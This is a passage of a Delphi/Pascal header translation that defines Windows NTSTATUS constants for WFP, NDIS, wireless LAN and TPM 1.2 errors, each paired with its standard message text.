STATUS_FWP_NEVER_MATCH           = NTSTATUS($C0220033);

//
// MessageId: STATUS_FWP_PROVIDER_CONTEXT_MISMATCH
//
// MessageText:
//
// The provider context is of the wrong type.
//
STATUS_FWP_PROVIDER_CONTEXT_MISMATCH = NTSTATUS($C0220034);

//
// MessageId: STATUS_FWP_INVALID_PARAMETER
//
// MessageText:
//
// The parameter is incorrect.
//
STATUS_FWP_INVALID_PARAMETER     = NTSTATUS($C0220035);

//
// MessageId: STATUS_FWP_TOO_MANY_SUBLAYERS
//
// MessageText:
//
// The maximum number of sublayers has been reached.
//
STATUS_FWP_TOO_MANY_SUBLAYERS    = NTSTATUS($C0220036);

//
// MessageId: STATUS_FWP_CALLOUT_NOTIFICATION_FAILED
//
// MessageText:
//
// The notification function for a callout returned an error.
//
STATUS_FWP_CALLOUT_NOTIFICATION_FAILED = NTSTATUS($C0220037);

//
// MessageId: STATUS_FWP_INVALID_AUTH_TRANSFORM
//
// MessageText:
//
// The IPsec authentication transform is not valid.
//
STATUS_FWP_INVALID_AUTH_TRANSFORM = NTSTATUS($C0220038);

//
// MessageId: STATUS_FWP_INVALID_CIPHER_TRANSFORM
//
// MessageText:
//
// The IPsec cipher transform is not valid.
//
STATUS_FWP_INVALID_CIPHER_TRANSFORM = NTSTATUS($C0220039);

//
// MessageId: STATUS_FWP_INCOMPATIBLE_CIPHER_TRANSFORM
//
// MessageText:
//
// The IPsec cipher transform is not compatible with the policy.
//
STATUS_FWP_INCOMPATIBLE_CIPHER_TRANSFORM = NTSTATUS($C022003A);

//
// MessageId: STATUS_FWP_INVALID_TRANSFORM_COMBINATION
//
// MessageText:
//
// The combination of IPsec transform types is not valid.
//
STATUS_FWP_INVALID_TRANSFORM_COMBINATION = NTSTATUS($C022003B);

//
// MessageId: STATUS_FWP_DUPLICATE_AUTH_METHOD
//
// MessageText:
//
// A policy cannot contain the same auth method more than once.
//
STATUS_FWP_DUPLICATE_AUTH_METHOD = NTSTATUS($C022003C);

//
// MessageId: STATUS_FWP_INVALID_TUNNEL_ENDPOINT
//
// MessageText:
//
// A tunnel endpoint configuration is invalid.
//
STATUS_FWP_INVALID_TUNNEL_ENDPOINT = NTSTATUS($C022003D);

//
// MessageId: STATUS_FWP_L2_DRIVER_NOT_READY
//
// MessageText:
//
// The WFP MAC Layers are not ready.
//
STATUS_FWP_L2_DRIVER_NOT_READY   = NTSTATUS($C022003E);

//
// MessageId: STATUS_FWP_KEY_DICTATOR_ALREADY_REGISTERED
//
// MessageText:
//
// A key manager capable of key dictation is already registered
//
STATUS_FWP_KEY_DICTATOR_ALREADY_REGISTERED = NTSTATUS($C022003F);

//
// MessageId: STATUS_FWP_KEY_DICTATION_INVALID_KEYING_MATERIAL
//
// MessageText:
//
// A key manager dictated invalid keys
//
STATUS_FWP_KEY_DICTATION_INVALID_KEYING_MATERIAL = NTSTATUS($C0220040);

//
// MessageId: STATUS_FWP_CONNECTIONS_DISABLED
//
// MessageText:
//
// The BFE IPsec Connection Tracking is disabled.
//
STATUS_FWP_CONNECTIONS_DISABLED  = NTSTATUS($C0220041);

//
// MessageId: STATUS_FWP_INVALID_DNS_NAME
//
// MessageText:
//
// The DNS name is invalid.
//
STATUS_FWP_INVALID_DNS_NAME      = NTSTATUS($C0220042);

//
// MessageId: STATUS_FWP_STILL_ON
//
// MessageText:
//
// The engine option is still enabled due to other configuration settings.
//
STATUS_FWP_STILL_ON              = NTSTATUS($C0220043);

//
// MessageId: STATUS_FWP_IKEEXT_NOT_RUNNING
//
// MessageText:
//
// The IKEEXT service is not running.  This service only runs when there is IPsec policy applied to the machine.
//
STATUS_FWP_IKEEXT_NOT_RUNNING    = NTSTATUS($C0220044);

//
// MessageId: STATUS_FWP_TCPIP_NOT_READY
//
// MessageText:
//
// The TCP/IP stack is not ready.
//
STATUS_FWP_TCPIP_NOT_READY       = NTSTATUS($C0220100);

//
// MessageId: STATUS_FWP_INJECT_HANDLE_CLOSING
//
// MessageText:
//
// The injection handle is being closed by another thread.
//
STATUS_FWP_INJECT_HANDLE_CLOSING = NTSTATUS($C0220101);

//
// MessageId: STATUS_FWP_INJECT_HANDLE_STALE
//
// MessageText:
//
// The injection handle is stale.
//
STATUS_FWP_INJECT_HANDLE_STALE   = NTSTATUS($C0220102);

//
// MessageId: STATUS_FWP_CANNOT_PEND
//
// MessageText:
//
// The classify cannot be pended.
//
STATUS_FWP_CANNOT_PEND           = NTSTATUS($C0220103);

//
// MessageId: STATUS_FWP_DROP_NOICMP
//
// MessageText:
//
// The packet should be dropped, no ICMP should be sent.
//
STATUS_FWP_DROP_NOICMP           = NTSTATUS($C0220104);


//
// NDIS error codes (ndis.sys)
//

//
// MessageId: STATUS_NDIS_CLOSING
//
// MessageText:
//
// The binding to the network interface is being closed.
//
STATUS_NDIS_CLOSING              = NTSTATUS($C0230002);

//
// MessageId: STATUS_NDIS_BAD_VERSION
//
// MessageText:
//
// An invalid version was specified.
//
STATUS_NDIS_BAD_VERSION          = NTSTATUS($C0230004);

//
// MessageId: STATUS_NDIS_BAD_CHARACTERISTICS
//
// MessageText:
//
// An invalid characteristics table was used.
//
STATUS_NDIS_BAD_CHARACTERISTICS  = NTSTATUS($C0230005);

//
// MessageId: STATUS_NDIS_ADAPTER_NOT_FOUND
//
// MessageText:
//
// Failed to find the network interface or network interface is not ready.
//
STATUS_NDIS_ADAPTER_NOT_FOUND    = NTSTATUS($C0230006);

//
// MessageId: STATUS_NDIS_OPEN_FAILED
//
// MessageText:
//
// Failed to open the network interface.
//
STATUS_NDIS_OPEN_FAILED          = NTSTATUS($C0230007);

//
// MessageId: STATUS_NDIS_DEVICE_FAILED
//
// MessageText:
//
// Network interface has encountered an internal unrecoverable failure.
//
STATUS_NDIS_DEVICE_FAILED        = NTSTATUS($C0230008);

//
// MessageId: STATUS_NDIS_MULTICAST_FULL
//
// MessageText:
//
// The multicast list on the network interface is full.
//
STATUS_NDIS_MULTICAST_FULL       = NTSTATUS($C0230009);

//
// MessageId: STATUS_NDIS_MULTICAST_EXISTS
//
// MessageText:
//
// An attempt was made to add a duplicate multicast address to the list.
//
STATUS_NDIS_MULTICAST_EXISTS     = NTSTATUS($C023000A);

//
// MessageId: STATUS_NDIS_MULTICAST_NOT_FOUND
//
// MessageText:
//
// At attempt was made to remove a multicast address that was never added.
//
STATUS_NDIS_MULTICAST_NOT_FOUND  = NTSTATUS($C023000B);

//
// MessageId: STATUS_NDIS_REQUEST_ABORTED
//
// MessageText:
//
// Network interface aborted the request.
//
STATUS_NDIS_REQUEST_ABORTED      = NTSTATUS($C023000C);

//
// MessageId: STATUS_NDIS_RESET_IN_PROGRESS
//
// MessageText:
//
// Network interface can not process the request because it is being reset.
//
STATUS_NDIS_RESET_IN_PROGRESS    = NTSTATUS($C023000D);

//
// MessageId: STATUS_NDIS_NOT_SUPPORTED
//
// MessageText:
//
// Network interface does not support this request.
//
STATUS_NDIS_NOT_SUPPORTED        = NTSTATUS($C02300BB);

//
// MessageId: STATUS_NDIS_INVALID_PACKET
//
// MessageText:
//
// An attempt was made to send an invalid packet on a network interface.
//
STATUS_NDIS_INVALID_PACKET       = NTSTATUS($C023000F);

//
// MessageId: STATUS_NDIS_ADAPTER_NOT_READY
//
// MessageText:
//
// Network interface is not ready to complete this operation.
//
STATUS_NDIS_ADAPTER_NOT_READY    = NTSTATUS($C0230011);

//
// MessageId: STATUS_NDIS_INVALID_LENGTH
//
// MessageText:
//
// The length of the buffer submitted for this operation is not valid.
//
STATUS_NDIS_INVALID_LENGTH       = NTSTATUS($C0230014);

//
// MessageId: STATUS_NDIS_INVALID_DATA
//
// MessageText:
//
// The data used for this operation is not valid.
//
STATUS_NDIS_INVALID_DATA         = NTSTATUS($C0230015);

//
// MessageId: STATUS_NDIS_BUFFER_TOO_SHORT
//
// MessageText:
//
// The length of buffer submitted for this operation is too small.
//
STATUS_NDIS_BUFFER_TOO_SHORT     = NTSTATUS($C0230016);

//
// MessageId: STATUS_NDIS_INVALID_OID
//
// MessageText:
//
// Network interface does not support this OID (Object Identifier)
//
STATUS_NDIS_INVALID_OID          = NTSTATUS($C0230017);

//
// MessageId: STATUS_NDIS_ADAPTER_REMOVED
//
// MessageText:
//
// The network interface has been removed.
//
STATUS_NDIS_ADAPTER_REMOVED      = NTSTATUS($C0230018);

//
// MessageId: STATUS_NDIS_UNSUPPORTED_MEDIA
//
// MessageText:
//
// Network interface does not support this media type.
//
STATUS_NDIS_UNSUPPORTED_MEDIA    = NTSTATUS($C0230019);

//
// MessageId: STATUS_NDIS_GROUP_ADDRESS_IN_USE
//
// MessageText:
//
// An attempt was made to remove a token ring group address that is in use by other components.
//
STATUS_NDIS_GROUP_ADDRESS_IN_USE = NTSTATUS($C023001A);

//
// MessageId: STATUS_NDIS_FILE_NOT_FOUND
//
// MessageText:
//
// An attempt was made to map a file that can not be found.
//
STATUS_NDIS_FILE_NOT_FOUND       = NTSTATUS($C023001B);

//
// MessageId: STATUS_NDIS_ERROR_READING_FILE
//
// MessageText:
//
// An error occurred while NDIS tried to map the file.
//
STATUS_NDIS_ERROR_READING_FILE   = NTSTATUS($C023001C);

//
// MessageId: STATUS_NDIS_ALREADY_MAPPED
//
// MessageText:
//
// An attempt was made to map a file that is already mapped.
//
STATUS_NDIS_ALREADY_MAPPED       = NTSTATUS($C023001D);

//
// MessageId: STATUS_NDIS_RESOURCE_CONFLICT
//
// MessageText:
//
// An attempt to allocate a hardware resource failed because the resource is used by another component.
//
STATUS_NDIS_RESOURCE_CONFLICT    = NTSTATUS($C023001E);

//
// MessageId: STATUS_NDIS_MEDIA_DISCONNECTED
//
// MessageText:
//
// The I/O operation failed because network media is disconnected or wireless access point is out of range.
//
STATUS_NDIS_MEDIA_DISCONNECTED   = NTSTATUS($C023001F);

//
// MessageId: STATUS_NDIS_INVALID_ADDRESS
//
// MessageText:
//
// The network address used in the request is invalid.
//
STATUS_NDIS_INVALID_ADDRESS      = NTSTATUS($C0230022);

//
// MessageId: STATUS_NDIS_INVALID_DEVICE_REQUEST
//
// MessageText:
//
// The specified request is not a valid operation for the target device.
//
STATUS_NDIS_INVALID_DEVICE_REQUEST = NTSTATUS($C0230010);

//
// MessageId: STATUS_NDIS_PAUSED
//
// MessageText:
//
// The offload operation on the network interface has been paused.
//
STATUS_NDIS_PAUSED               = NTSTATUS($C023002A);

//
// MessageId: STATUS_NDIS_INTERFACE_NOT_FOUND
//
// MessageText:
//
// Network interface was not found.
//
STATUS_NDIS_INTERFACE_NOT_FOUND  = NTSTATUS($C023002B);

//
// MessageId: STATUS_NDIS_UNSUPPORTED_REVISION
//
// MessageText:
//
// The revision number specified in the structure is not supported.
//
STATUS_NDIS_UNSUPPORTED_REVISION = NTSTATUS($C023002C);

//
// MessageId: STATUS_NDIS_INVALID_PORT
//
// MessageText:
//
// The specified port does not exist on this network interface.
//
STATUS_NDIS_INVALID_PORT         = NTSTATUS($C023002D);

//
// MessageId: STATUS_NDIS_INVALID_PORT_STATE
//
// MessageText:
//
// The current state of the specified port on this network interface does not support the requested operation.
//
STATUS_NDIS_INVALID_PORT_STATE   = NTSTATUS($C023002E);

//
// MessageId: STATUS_NDIS_LOW_POWER_STATE
//
// MessageText:
//
// The miniport adapter is in lower power state.
//
STATUS_NDIS_LOW_POWER_STATE      = NTSTATUS($C023002F);

//
// MessageId: STATUS_NDIS_REINIT_REQUIRED
//
// MessageText:
//
// This operation requires the miniport adapter to be reinitialized.
//
STATUS_NDIS_REINIT_REQUIRED      = NTSTATUS($C0230030);

//
// MessageId: STATUS_NDIS_NO_QUEUES
//
// MessageText:
//
// There are not enough queues to complete the operation.
//
STATUS_NDIS_NO_QUEUES            = NTSTATUS($C0230031);


//
// NDIS error codes (802.11 wireless LAN)
//

//
// MessageId: STATUS_NDIS_DOT11_AUTO_CONFIG_ENABLED
//
// MessageText:
//
// The wireless local area network interface is in auto configuration mode and doesn't support the requested parameter change operation.
//
STATUS_NDIS_DOT11_AUTO_CONFIG_ENABLED = NTSTATUS($C0232000);

//
// MessageId: STATUS_NDIS_DOT11_MEDIA_IN_USE
//
// MessageText:
//
// The wireless local area network interface is busy and can not perform the requested operation.
//
STATUS_NDIS_DOT11_MEDIA_IN_USE   = NTSTATUS($C0232001);

//
// MessageId: STATUS_NDIS_DOT11_POWER_STATE_INVALID
//
// MessageText:
//
// The wireless local area network interface is powered down and doesn't support the requested operation.
//
STATUS_NDIS_DOT11_POWER_STATE_INVALID = NTSTATUS($C0232002);

//
// MessageId: STATUS_NDIS_PM_WOL_PATTERN_LIST_FULL
//
// MessageText:
//
// The list of wake on LAN patterns is full.
//
STATUS_NDIS_PM_WOL_PATTERN_LIST_FULL = NTSTATUS($C0232003);

//
// MessageId: STATUS_NDIS_PM_PROTOCOL_OFFLOAD_LIST_FULL
//
// MessageText:
//
// The list of low power protocol offloads is full.
//
STATUS_NDIS_PM_PROTOCOL_OFFLOAD_LIST_FULL = NTSTATUS($C0232004);

//
// MessageId: STATUS_NDIS_DOT11_AP_CHANNEL_CURRENTLY_NOT_AVAILABLE
//
// MessageText:
//
// The wireless local area network interface cannot start an AP on the specified channel right now.
//
STATUS_NDIS_DOT11_AP_CHANNEL_CURRENTLY_NOT_AVAILABLE = NTSTATUS($C0232005);

//
// MessageId: STATUS_NDIS_DOT11_AP_BAND_CURRENTLY_NOT_AVAILABLE
//
// MessageText:
//
// The wireless local area network interface cannot start an AP on the specified band right now.
//
STATUS_NDIS_DOT11_AP_BAND_CURRENTLY_NOT_AVAILABLE = NTSTATUS($C0232006);

//
// MessageId: STATUS_NDIS_DOT11_AP_CHANNEL_NOT_ALLOWED
//
// MessageText:
//
// The wireless local area network interface cannot start an AP on this channel due to regulatory reasons.
//
STATUS_NDIS_DOT11_AP_CHANNEL_NOT_ALLOWED = NTSTATUS($C0232007);

//
// MessageId: STATUS_NDIS_DOT11_AP_BAND_NOT_ALLOWED
//
// MessageText:
//
// The wireless local area network interface cannot start an AP on this band due to regulatory reasons.
//
STATUS_NDIS_DOT11_AP_BAND_NOT_ALLOWED = NTSTATUS($C0232008);

//
// NDIS informational codes(ndis.sys)
//

//
// MessageId: STATUS_NDIS_INDICATION_REQUIRED
//
// MessageText:
//
// The request will be completed later by NDIS status indication.
//
STATUS_NDIS_INDICATION_REQUIRED  = NTSTATUS($40230001);

//
// NDIS Chimney Offload codes (ndis.sys)
//

//
// MessageId: STATUS_NDIS_OFFLOAD_POLICY
//
// MessageText:
//
// The TCP connection is not offloadable because of a local policy setting.
//
STATUS_NDIS_OFFLOAD_POLICY       = NTSTATUS($C023100F);

//
// MessageId: STATUS_NDIS_OFFLOAD_CONNECTION_REJECTED
//
// MessageText:
//
// The TCP connection is not offloadable by the Chimney offload target.
//
STATUS_NDIS_OFFLOAD_CONNECTION_REJECTED = NTSTATUS($C0231012);

//
// MessageId: STATUS_NDIS_OFFLOAD_PATH_REJECTED
//
// MessageText:
//
// The IP Path object is not in an offloadable state.
//
STATUS_NDIS_OFFLOAD_PATH_REJECTED = NTSTATUS($C0231013);

//
// TPM hardware errors {0x0000..0x003ff}
//
//
// MessageId: STATUS_TPM_ERROR_MASK
//
// MessageText:
//
// This is an error mask to convert TPM hardware errors to win errors.
//
STATUS_TPM_ERROR_MASK            = NTSTATUS($C0290000);

//
// MessageId: STATUS_TPM_AUTHFAIL
//
// MessageText:
//
// TPM 1.2: Authentication failed.
//
STATUS_TPM_AUTHFAIL              = NTSTATUS($C0290001);

//
// MessageId: STATUS_TPM_BADINDEX
//
// MessageText:
//
// TPM 1.2: The index to a PCR, DIR or other register is incorrect.
//
STATUS_TPM_BADINDEX              = NTSTATUS($C0290002);

//
// MessageId: STATUS_TPM_BAD_PARAMETER
//
// MessageText:
//
// TPM 1.2: One or more parameter is bad.
//
STATUS_TPM_BAD_PARAMETER         = NTSTATUS($C0290003);

//
// MessageId: STATUS_TPM_AUDITFAILURE
//
// MessageText:
//
// TPM 1.2: An operation completed successfully but the auditing of that operation failed.
//
STATUS_TPM_AUDITFAILURE          = NTSTATUS($C0290004);

//
// MessageId: STATUS_TPM_CLEAR_DISABLED
//
// MessageText:
//
// TPM 1.2: The clear disable flag is set and all clear operations now require physical access.
//
STATUS_TPM_CLEAR_DISABLED        = NTSTATUS($C0290005);

//
// MessageId: STATUS_TPM_DEACTIVATED
//
// MessageText:
//
// TPM 1.2: Activate the Trusted Platform Module (TPM).
//
STATUS_TPM_DEACTIVATED           = NTSTATUS($C0290006);

//
// MessageId: STATUS_TPM_DISABLED
//
// MessageText:
//
// TPM 1.2: Enable the Trusted Platform Module (TPM).
//
STATUS_TPM_DISABLED              = NTSTATUS($C0290007);

//
// MessageId: STATUS_TPM_DISABLED_CMD
//
// MessageText:
//
// TPM 1.2: The target command has been disabled.
//
STATUS_TPM_DISABLED_CMD          = NTSTATUS($C0290008);

//
// MessageId: STATUS_TPM_FAIL
//
// MessageText:
//
// TPM 1.2: The operation failed.
//
STATUS_TPM_FAIL                  = NTSTATUS($C0290009);

//
// MessageId: STATUS_TPM_BAD_ORDINAL
//
// MessageText:
//
// TPM 1.2: The ordinal was unknown or inconsistent.
//
STATUS_TPM_BAD_ORDINAL           = NTSTATUS($C029000A);

//
// MessageId: STATUS_TPM_INSTALL_DISABLED
//
// MessageText:
//
// TPM 1.2: The ability to install an owner is disabled.
//
STATUS_TPM_INSTALL_DISABLED      = NTSTATUS($C029000B);

//
// MessageId: STATUS_TPM_INVALID_KEYHANDLE
//
// MessageText:
//
// TPM 1.2: The key handle cannot be interpreted.
//
STATUS_TPM_INVALID_KEYHANDLE     = NTSTATUS($C029000C);

//
// MessageId: STATUS_TPM_KEYNOTFOUND
//
// MessageText:
//
// TPM 1.2: The key handle points to an invalid key.
//
STATUS_TPM_KEYNOTFOUND           = NTSTATUS($C029000D);

//
// MessageId: STATUS_TPM_INAPPROPRIATE_ENC
//
// MessageText:
//
// TPM 1.2: Unacceptable encryption scheme.
//
STATUS_TPM_INAPPROPRIATE_ENC     = NTSTATUS($C029000E);

//
// MessageId: STATUS_TPM_MIGRATEFAIL
//
// MessageText:
//
// TPM 1.2: Migration authorization failed.
//
STATUS_TPM_MIGRATEFAIL           = NTSTATUS($C029000F);

//
// MessageId: STATUS_TPM_INVALID_PCR_INFO
//
// MessageText:
//
// TPM 1.2: PCR information could not be interpreted.
//
STATUS_TPM_INVALID_PCR_INFO      = NTSTATUS($C0290010);

//
// MessageId: STATUS_TPM_NOSPACE
//
// MessageText:
//
// TPM 1.2: No room to load key.
//
STATUS_TPM_NOSPACE               = NTSTATUS($C0290011);

//
// MessageId: STATUS_TPM_NOSRK
//
// MessageText:
//
// TPM 1.2: There is no Storage Root Key (SRK) set.
//
STATUS_TPM_NOSRK                 = NTSTATUS($C0290012);

//
// MessageId: STATUS_TPM_NOTSEALED_BLOB
//
// MessageText:
//
// TPM 1.2: An encrypted blob is invalid or was not created by this TPM.
//
STATUS_TPM_NOTSEALED_BLOB        = NTSTATUS($C0290013);

//
// MessageId: STATUS_TPM_OWNER_SET
//
// MessageText:
//
// TPM 1.2: The Trusted Platform Module (TPM) already has an owner.
//
STATUS_TPM_OWNER_SET             = NTSTATUS($C0290014);

//
// MessageId: STATUS_TPM_RESOURCES
//
// MessageText:
//
// TPM 1.2: The TPM has insufficient internal resources to perform the requested action.
//
STATUS_TPM_RESOURCES             = NTSTATUS($C0290015);

//
// MessageId: STATUS_TPM_SHORTRANDOM
//
// MessageText:
//
// TPM 1.2: A random string was too short.
//
STATUS_TPM_SHORTRANDOM           = NTSTATUS($C0290016);

//
// MessageId: STATUS_TPM_SIZE
//
// MessageText:
//
// TPM 1.2: The TPM does not have the space to perform the operation.
//
STATUS_TPM_SIZE                  = NTSTATUS($C0290017);

//
// MessageId: STATUS_TPM_WRONGPCRVAL
//
// MessageText:
//
// TPM 1.2: The named PCR value does not match the current PCR value.
//
STATUS_TPM_WRONGPCRVAL           = NTSTATUS($C0290018);

//
// MessageId: STATUS_TPM_BAD_PARAM_SIZE
//
// MessageText:
//
// TPM 1.2: The paramSize argument to the command has the incorrect value .
//
STATUS_TPM_BAD_PARAM_SIZE        = NTSTATUS($C0290019);

//
// MessageId: STATUS_TPM_SHA_THREAD
//
// MessageText:
//
// TPM 1.2: There is no existing SHA-1 thread.
//
STATUS_TPM_SHA_THREAD            = NTSTATUS($C029001A);

//
// MessageId: STATUS_TPM_SHA_ERROR
//
// MessageText:
//
// TPM 1.2: The calculation is unable to proceed because the existing SHA-1 thread has already encountered an error.
//
STATUS_TPM_SHA_ERROR             = NTSTATUS($C029001B);

//
// MessageId: STATUS_TPM_FAILEDSELFTEST
//
// MessageText:
//
// TPM 1.2: The TPM hardware device reported a failure during its internal self test. Try restarting the computer to resolve the problem. If the problem continues, you might need to replace your TPM hardware or motherboard.
//
STATUS_TPM_FAILEDSELFTEST        = NTSTATUS($C029001C);

//
// MessageId: STATUS_TPM_AUTH2FAIL
//
// MessageText:
//
// TPM 1.2: The authorization for the second key in a 2 key function failed authorization.
//
STATUS_TPM_AUTH2FAIL             = NTSTATUS($C029001D);

//
// MessageId: STATUS_TPM_BADTAG
//
// MessageText:
//
// TPM 1.2: The tag value sent to for a command is invalid.
//
STATUS_TPM_BADTAG                = NTSTATUS($C029001E);

//
// MessageId: STATUS_TPM_IOERROR
//
// MessageText:
//
// TPM 1.2: An IO error occurred transmitting information to the TPM.
//
STATUS_TPM_IOERROR               = NTSTATUS($C029001F);

//
// MessageId: STATUS_TPM_ENCRYPT_ERROR
//
// MessageText:
//
// TPM 1.2: The encryption process had a problem.
//
STATUS_TPM_ENCRYPT_ERROR         = NTSTATUS($C0290020);

//
// MessageId: STATUS_TPM_DECRYPT_ERROR
//
// MessageText:
//
// TPM 1.2: The decryption process did not complete.
//
STATUS_TPM_DECRYPT_ERROR         = NTSTATUS($C0290021);

//
// MessageId: STATUS_TPM_INVALID_AUTHHANDLE
//
// MessageText:
//
// TPM 1.2: An invalid handle was used.
//
STATUS_TPM_INVALID_AUTHHANDLE    = NTSTATUS($C0290022);

//
// MessageId: STATUS_TPM_NO_ENDORSEMENT
//
// MessageText:
//
// TPM 1.2: The TPM does not have an Endorsement Key (EK) installed.
//
STATUS_TPM_NO_ENDORSEMENT        = NTSTATUS($C0290023);

//
// MessageId: STATUS_TPM_INVALID_KEYUSAGE
//
// MessageText:
//
// TPM 1.2: The usage of a key is not allowed.
//
STATUS_TPM_INVALID_KEYUSAGE      = NTSTATUS($C0290024);

//
// MessageId: STATUS_TPM_WRONG_ENTITYTYPE
//
// MessageText:
//
// TPM 1.2: The submitted entity type is not allowed.
//
STATUS_TPM_WRONG_ENTITYTYPE      = NTSTATUS($C0290025);

//
// MessageId: STATUS_TPM_INVALID_POSTINIT
//
// MessageText:
//
// TPM 1.2: The command was received in the wrong sequence relative to TPM_Init and a subsequent TPM_Startup.
//
STATUS_TPM_INVALID_POSTINIT      = NTSTATUS($C0290026);

//
// MessageId: STATUS_TPM_INAPPROPRIATE_SIG
//
// MessageText:
//
// TPM 1.2: Signed data cannot include additional DER information.
//
STATUS_TPM_INAPPROPRIATE_SIG     = NTSTATUS($C0290027);

//
// MessageId: STATUS_TPM_BAD_KEY_PROPERTY
//
// MessageText:
//
// TPM 1.2: The key properties in TPM_KEY_PARMs are not supported by this TPM.
//
STATUS_TPM_BAD_KEY_PROPERTY      = NTSTATUS($C0290028);

//
// MessageId: STATUS_TPM_BAD_MIGRATION
//
// MessageText:
//
// TPM 1.2: The migration properties of this key are incorrect.
//
STATUS_TPM_BAD_MIGRATION         = NTSTATUS($C0290029);

//
// MessageId: STATUS_TPM_BAD_SCHEME
//
// MessageText:
//
// TPM 1.2: The signature or encryption scheme for this key is incorrect or not permitted in this situation.
//
STATUS_TPM_BAD_SCHEME            = NTSTATUS($C029002A);

//
// MessageId: STATUS_TPM_BAD_DATASIZE
//
// MessageText:
//
// TPM 1.2: The size of the data (or blob) parameter is bad or inconsistent with the referenced key.
//
STATUS_TPM_BAD_DATASIZE          = NTSTATUS($C029002B);

//
// MessageId: STATUS_TPM_BAD_MODE
//
// MessageText:
//
// TPM 1.2: A mode parameter is bad, such as capArea or subCapArea for TPM_GetCapability, phsicalPresence parameter for TPM_PhysicalPresence, or migrationType for TPM_CreateMigrationBlob.
//
STATUS_TPM_BAD_MODE              = NTSTATUS($C029002C);

//
// MessageId: STATUS_TPM_BAD_PRESENCE
//
// MessageText:
//
// TPM 1.2: Either the physicalPresence or physicalPresenceLock bits have the wrong value.
//
STATUS_TPM_BAD_PRESENCE          = NTSTATUS($C029002D);

//
// MessageId: STATUS_TPM_BAD_VERSION
//
// MessageText:
//
// TPM 1.2: The TPM cannot perform this version of the capability.
//
STATUS_TPM_BAD_VERSION           = NTSTATUS($C029002E);

//
// MessageId: STATUS_TPM_NO_WRAP_TRANSPORT
//
// MessageText:
//
// TPM 1.2: The TPM does not allow for wrapped transport sessions.
//
STATUS_TPM_NO_WRAP_TRANSPORT     = NTSTATUS($C029002F);

//
// MessageId: STATUS_TPM_AUDITFAIL_UNSUCCESSFUL
//
// MessageText:
//
// TPM 1.2: TPM audit construction failed and the underlying command was returning a failure code also.
//
STATUS_TPM_AUDITFAIL_UNSUCCESSFUL = NTSTATUS($C0290030);

//
// MessageId: STATUS_TPM_AUDITFAIL_SUCCESSFUL
//
// MessageText:
//
// TPM 1.2: TPM audit construction failed and the underlying command was returning success.
//
STATUS_TPM_AUDITFAIL_SUCCESSFUL  = NTSTATUS($C0290031);

//
// MessageId: STATUS_TPM_NOTRESETABLE
//
// MessageText:
//
// TPM 1.2: Attempt to reset a PCR register that does not have the resettable attribute.
//
STATUS_TPM_NOTRESETABLE          = NTSTATUS($C0290032);

//
// MessageId: STATUS_TPM_NOTLOCAL
//
// MessageText:
//
// TPM 1.2: Attempt to reset a PCR register that requires locality and locality modifier not part of command transport.
//
STATUS_TPM_NOTLOCAL              = NTSTATUS($C0290033);

//
// MessageId: STATUS_TPM_BAD_TYPE
//
// MessageText:
//
// TPM 1.2: Make identity blob not properly typed.
//
STATUS_TPM_BAD_TYPE              = NTSTATUS($C0290034);

//
// MessageId: STATUS_TPM_INVALID_RESOURCE
//
// MessageText:
//
// TPM 1.2: When saving context identified resource type does not match actual resource.
//
STATUS_TPM_INVALID_RESOURCE      = NTSTATUS($C0290035);

//
// MessageId: STATUS_TPM_NOTFIPS
//
// MessageText:
//
// TPM 1.2: The TPM is attempting to execute a command only available when in FIPS mode.
//
STATUS_TPM_NOTFIPS               = NTSTATUS($C0290036);

//
// MessageId: STATUS_TPM_INVALID_FAMILY
//
// MessageText:
//
// TPM 1.2: The command is attempting to use an invalid family ID.
//
STATUS_TPM_INVALID_FAMILY        = NTSTATUS($C0290037);

//
// MessageId: STATUS_TPM_NO_NV_PERMISSION
//
// MessageText:
//
// TPM 1.2: The permission to manipulate the NV storage is not available.
//
STATUS_TPM_NO_NV_PERMISSION      = NTSTATUS($C0290038);

//
// MessageId: STATUS_TPM_REQUIRES_SIGN
//
// MessageText:
//
// TPM 1.2: The operation requires a signed command.
//
STATUS_TPM_REQUIRES_SIGN         = NTSTATUS($C0290039);

//
// MessageId: STATUS_TPM_KEY_NOTSUPPORTED
//
// MessageText:
//
// TPM 1.2: Wrong operation to load an NV key.
//
STATUS_TPM_KEY_NOTSUPPORTED      = NTSTATUS($C029003A);

//
// MessageId: STATUS_TPM_AUTH_CONFLICT
//
// MessageText:
//
// TPM 1.2: NV_LoadKey blob requires both owner and blob authorization.
//
STATUS_TPM_AUTH_CONFLICT         = NTSTATUS($C029003B);

//
// MessageId: STATUS_TPM_AREA_LOCKED
//
// MessageText:
//
// TPM 1.2: The NV area is locked and not writable.
//
STATUS_TPM_AREA_LOCKED           = NTSTATUS($C029003C);

//
// MessageId: STATUS_TPM_BAD_LOCALITY
//
// MessageText:
//
// TPM 1.2: The locality is incorrect for the attempted operation.
//
STATUS_TPM_BAD_LOCALITY          = NTSTATUS($C029003D);

//
// MessageId: STATUS_TPM_READ_ONLY
//
// MessageText:
//
// TPM 1.2: The NV area is read only and can't be written to.
//
STATUS_TPM_READ_ONLY             = NTSTATUS($C029003E);

//
// MessageId: STATUS_TPM_PER_NOWRITE
//
// MessageText:
//
// TPM 1.2: There is no protection on the write to the NV area.
//
STATUS_TPM_PER_NOWRITE           = NTSTATUS($C029003F);

//
// MessageId: STATUS_TPM_FAMILYCOUNT
//
// MessageText:
//
// TPM 1.2: The family count value does not match.
//
STATUS_TPM_FAMILYCOUNT           = NTSTATUS($C0290040);

//
// MessageId: STATUS_TPM_WRITE_LOCKED
//
// MessageText:
//
// TPM 1.2: The NV area has already been written to.
//
STATUS_TPM_WRITE_LOCKED          = NTSTATUS($C0290041);

//
// MessageId: STATUS_TPM_BAD_ATTRIBUTES
//
// MessageText:
//
// TPM 1.2: The NV area attributes conflict.
//
STATUS_TPM_BAD_ATTRIBUTES        = NTSTATUS($C0290042);

//
// MessageId: STATUS_TPM_INVALID_STRUCTURE
//
// MessageText:
//
// TPM 1.2: The structure tag and version are invalid or inconsistent.
//
STATUS_TPM_INVALID_STRUCTURE     = NTSTATUS($C0290043);

//
// MessageId: STATUS_TPM_KEY_OWNER_CONTROL
//
// MessageText:
//
// TPM 1.2: The key is under control of the TPM Owner and can only be evicted by the TPM Owner.
//
STATUS_TPM_KEY_OWNER_CONTROL     = NTSTATUS($C0290044);

//
// MessageId: STATUS_TPM_BAD_COUNTER
//
// MessageText:
//
// TPM 1.2: The counter handle is incorrect.
//
STATUS_TPM_BAD_COUNTER           = NTSTATUS($C0290045);

//
// MessageId: STATUS_TPM_NOT_FULLWRITE
//
// MessageText:
//
// TPM 1.2: The write is not a complete write of the area.
//
